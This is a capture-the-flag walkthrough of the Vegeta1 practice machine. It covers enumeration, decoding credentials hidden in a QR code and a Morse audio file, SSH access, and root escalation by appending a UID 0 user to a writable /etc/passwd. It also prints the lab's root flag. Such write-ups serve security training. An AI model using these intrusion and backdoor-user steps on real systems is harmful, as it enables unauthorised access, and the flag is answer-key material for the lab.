# Vegeta1 - Proving Grounds Play

## Machine Info
| Property | Value |
|----------|-------|
| Platform | Proving Grounds Play |
| OS | Linux (Debian) |
| Difficulty | Easy |

## Summary

Vegeta1 involves web enumeration to discover hidden directories, decoding a QR code from base64-encoded data, extracting SSH credentials from a Morse code audio file, and privilege escalation via a misconfigured `/etc/passwd` file.

---

## Enumeration

### Port Scanning

Start with a service version scan to identify open ports and running services:

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

**Results:**
```
Starting Nmap 7.98 ( https://nmap.org )
Nmap scan report for <TARGET_IP>
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- Port 22: SSH (OpenSSH 7.9p1)
- Port 80: HTTP (Apache 2.4.38)

Run a full port scan to ensure no ports are missed:

```bash
nmap -p- --min-rate=1000 -T4 <TARGET_IP>
```

This confirms only ports 22 and 80 are open.

---

### Web Enumeration

#### Step 1: Browse the Main Page

Open a browser and navigate to `http://<TARGET_IP>/`

You'll see a page with:
- Title: "King Vegeta"
- An image file: `vegeta1.jpg`

This is a Dragon Ball Z theme - keep this in mind for directory guessing later.

#### Step 2: Check robots.txt

```bash
curl http://<TARGET_IP>/robots.txt
```

**Output:**
```
*
/find_me
```

This reveals a hidden directory: `/find_me`

#### Step 3: Run Directory Enumeration

Use nmap's http-enum script:

```bash
nmap -p80 --script http-enum <TARGET_IP>
```

**Output:**
```
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/admin.php: Possible admin folder
|   /login.php: Possible admin folder
|   /robots.txt: Robots file
|   /image/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /manual/: Potentially interesting folder
```

#### Step 4: Enumerate Each Directory

Check `/admin/`:
```bash
curl http://<TARGET_IP>/admin/
```

You'll see it contains `admin.php`, but it's empty (just `<?php ?>`).

Check `/img/`:
```bash
curl http://<TARGET_IP>/img/
```

Contains `vegeta.jpg` - another image file.

Check `/find_me/`:
```bash
curl http://<TARGET_IP>/find_me/
```

Contains `find_me.html` - we'll examine this next.

#### Step 5: Try Dragon Ball Z Character Names

Since this is a DBZ-themed box, try character names as directories:

```bash
# Check for /bulma/ directory
curl -s -o /dev/null -w "%{http_code}" http://<TARGET_IP>/bulma/
```

**Output:** `200`

The `/bulma/` directory exists. Check its contents:

```bash
curl http://<TARGET_IP>/bulma/
```

**Output:**
```html
<h1>Index of /bulma</h1>
<table>
...
<tr><td><a href="hahahaha.wav">hahahaha.wav</a></td>
<td align="right">2020-06-28 18:19</td>
<td align="right">231K</td></tr>
...
</table>
```

**Found an audio file:** `hahahaha.wav` (231KB) - this contains the Morse code.

---

## Exploitation

### Step 1: Analyze find_me.html for Hidden Data

View the full source of `/find_me/find_me.html`:

```bash
curl http://<TARGET_IP>/find_me/find_me.html
```

**Output:**
```html
<html>
<head> Vegeta-1.0 </head>
<body></body>
</html>

[... many blank lines ...]

<!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== -->
```

The HTML comment at the bottom contains a long base64-encoded string.

### Step 2: Decode the Base64 String

The string is **double base64-encoded**. We need to decode it twice.

**Method 1: Command Line**

```bash
# Save the base64 string to a file
curl -s http://<TARGET_IP>/find_me/find_me.html | grep -oP '(?<=<!-- ).*(?= -->)' > encoded.txt

# First decode - this outputs another base64 string
cat encoded.txt | base64 -d > first_decode.txt

# Check what we got
head -c 100 first_decode.txt
```

You'll see it's still base64. Decode again:

```bash
# Second decode - this outputs a PNG image
cat first_decode.txt | base64 -d > qrcode.png

# Verify it's a PNG image
file qrcode.png
```

**Output:**
```
qrcode.png: PNG image data, 200 x 200, 8-bit/color RGBA, non-interlaced
```

**Method 2: One-liner**

```bash
curl -s http://<TARGET_IP>/find_me/find_me.html | grep -oP '(?<=<!-- ).*(?= -->)' | base64 -d | base64 -d > qrcode.png
```

### Step 3: Decode the QR Code

Install `zbar-tools` if not already installed:

```bash
sudo apt update
sudo apt install zbar-tools -y
```

Decode the QR code:

```bash
zbarimg qrcode.png
```

**Output:**
```
QR-Code:Password : topshellv
scanned 1 barcode symbols from 1 images in 0.03 seconds
```

**Result:** We found a password: `topshellv`

Save this for later - it might be useful.

### Step 4: Download the Morse Code Audio File

Download the WAV file from `/bulma/`:

```bash
curl http://<TARGET_IP>/bulma/hahahaha.wav -o hahahaha.wav
```

Verify the download:

```bash
file hahahaha.wav
```

**Output:**
```
hahahaha.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 8000 Hz
```

Check audio properties:

```bash
# Install sox if needed
sudo apt install sox -y

# Get audio info
soxi hahahaha.wav
```

**Output:**
```
Input File     : 'hahahaha.wav'
Channels       : 1
Sample Rate    : 8000
Precision      : 8-bit
Duration       : 00:00:29.51 = 236080 samples ~ 2213.25 CDDA sectors
File Size      : 236k
Bit Rate       : 64.0k
Sample Encoding: 8-bit Unsigned Integer PCM
```

The file is 29.51 seconds long - this is the Morse code message.

### Step 5: Decode the Morse Code

Install `morse2ascii`:

```bash
sudo apt install morse2ascii -y
```

Decode the audio file:

```bash
morse2ascii hahahaha.wav
```

**Output:**
```
MORSE2ASCII 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- open hahahaha.wav
  wave size      236080
  format tag     1
  channels:      1
  samples/sec:   8000
  avg/bytes/sec: 8000
  block align:   1
  bits:          8
  samples:       236080
  bias adjust:   0
  volume peaks:  -31744 31744
  normalize:     1023

- decoded morse data:
user  : trunks  password  : us3r((s  in  dollars  symbol))
```

**Decoded credentials:**
- **Username:** `trunks`
- **Password hint:** `us3r` with "s in dollars symbol"
- **Actual password:** `u$3r` (replace 's' with '$')

### Step 6: SSH into the Machine

Connect via SSH using the decoded credentials:

```bash
ssh trunks@<TARGET_IP>
```

When prompted for password, enter: `u$3r`

**Successful login:**
```
trunks@vegeta:~$ id
uid=1000(trunks) gid=1000(trunks) groups=1000(trunks),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)

trunks@vegeta:~$ whoami
trunks

trunks@vegeta:~$ pwd
/home/trunks
```

### Step 7: Get User Flag

```bash
cat /home/trunks/local.txt
```

---

## Privilege Escalation

### Step 1: Check for Quick Wins

Check sudo permissions:

```bash
sudo -l
```

No sudo access.

Check SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Nothing unusual.

### Step 2: Check File Permissions

Check `/etc/passwd` permissions:

```bash
ls -la /etc/passwd
```

**Output:**
```
-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd
```

**Critical finding:** The `/etc/passwd` file is **owned by trunks**!

This means we can modify it and add a new user with root privileges (UID 0).

### Step 3: Generate a Password Hash

We need to create a password hash for our new root user. Use `openssl` to generate an MD5-based hash:

```bash
openssl passwd -1 password
```

**Output:**
```
$1$Kz8PAB8F$FcaWpSLLnPaoSR0w6uc5T0
```

Note: Your hash will be different due to random salt. Copy your full hash.

### Step 4: Add a New Root User

Create a new line for `/etc/passwd` with:
- Username: `hacker`
- Password hash: (the one you generated)
- UID: `0` (root)
- GID: `0` (root)
- Home: `/root`
- Shell: `/bin/bash`

Append to `/etc/passwd`:

```bash
echo 'hacker:$1$Kz8PAB8F$FcaWpSLLnPaoSR0w6uc5T0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Important:** Replace the hash with the one you generated.

Verify the user was added:

```bash
tail -1 /etc/passwd
```

**Output:**
```
hacker:$1$Kz8PAB8F$FcaWpSLLnPaoSR0w6uc5T0:0:0:root:/root:/bin/bash
```

### Step 5: Switch to Root

Switch to the new root user:

```bash
su hacker
```

Enter password: `password`

**Verify root access:**
```bash
id
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

```bash
whoami
```

**Output:**
```
root
```

### Step 6: Get Root Flag

```bash
cat /root/proof.txt
```

**Output:**
```
2d9b287dcae0b85de9df1cddca79212d
```

---

## Flags

| Flag | Location | Hash |
|------|----------|------|
| User | `/home/trunks/local.txt` | (varies) |
| Root | `/root/proof.txt` | `2d9b287dcae0b85de9df1cddca79212d` |

---

## Attack Path Summary

```
┌──────────────────────────────────────────────────────────────────┐
│ 1. ENUMERATION                                                   │
│    nmap scan → Ports 22 (SSH), 80 (HTTP)                        │
│    robots.txt → /find_me/                                        │
│    http-enum → /admin/, /img/, /image/                          │
│    Manual guess (DBZ theme) → /bulma/                           │
├──────────────────────────────────────────────────────────────────┤
│ 2. WEB ANALYSIS                                                  │
│    /find_me/find_me.html → Base64 in HTML comment               │
│    Double base64 decode → QR code PNG                           │
│    QR decode → "Password : topshellv"                           │
│    /bulma/hahahaha.wav → Morse code audio                       │
│    Morse decode → "user: trunks, password: u$3r"                │
├──────────────────────────────────────────────────────────────────┤
│ 3. INITIAL ACCESS                                                │
│    SSH as trunks:u$3r                                           │
├──────────────────────────────────────────────────────────────────┤
│ 4. PRIVILEGE ESCALATION                                          │
│    /etc/passwd owned by trunks                                   │
│    Add user with UID 0 → Root shell                             │
└──────────────────────────────────────────────────────────────────┘
```

---

## Tools Used

| Tool | Installation | Purpose |
|------|--------------|---------|
| nmap | `sudo apt install nmap` | Port scanning, service enumeration |
| curl | Pre-installed | HTTP requests |
| base64 | Pre-installed | Base64 decoding |
| zbarimg | `sudo apt install zbar-tools` | QR code decoding |
| soxi | `sudo apt install sox` | Audio file analysis |
| morse2ascii | `sudo apt install morse2ascii` | Morse code audio decoding |
| openssl | Pre-installed | Password hash generation |

---

## Alternative Methods

### QR Code Decoding Alternatives

If `zbarimg` doesn't work, you can use:

**Online decoder:**
1. Open https://webqr.com/
2. Upload `qrcode.png`
3. Read the result

**Python:**
```bash
pip install pyzbar pillow
python3 -c "from PIL import Image; from pyzbar.pyzbar import decode; print(decode(Image.open('qrcode.png'))[0].data.decode())"
```

### Morse Code Decoding Alternatives

**Online decoder:**
1. Go to https://morsecode.world/international/decoder/audio-decoder-adaptive.html
2. Upload `hahahaha.wav`
3. Read the decoded message

**Manual method:**
1. Open the WAV file in Audacity
2. Visualize the waveform
3. Identify dots (short) and dashes (long)
4. Decode using a Morse code chart

---

## Lessons Learned

1. **Theme-based enumeration** - The machine was Dragon Ball Z themed. Trying character names (`bulma`, `vegeta`, `trunks`, `goku`) as directories revealed `/bulma/` which contained the critical audio file.

2. **Check HTML source code** - The base64-encoded QR code was hidden in an HTML comment. Always view page source.

3. **Multi-layer encoding** - The data was double base64-encoded. If decoded output looks like base64, decode it again.

4. **File permission misconfigurations** - `/etc/passwd` being writable by a regular user is a critical vulnerability. Always check file permissions during privilege escalation.

5. **Password hints** - The Morse code said "s in dollars symbol" meaning replace 's' with '$'. Pay attention to hints in decoded messages.
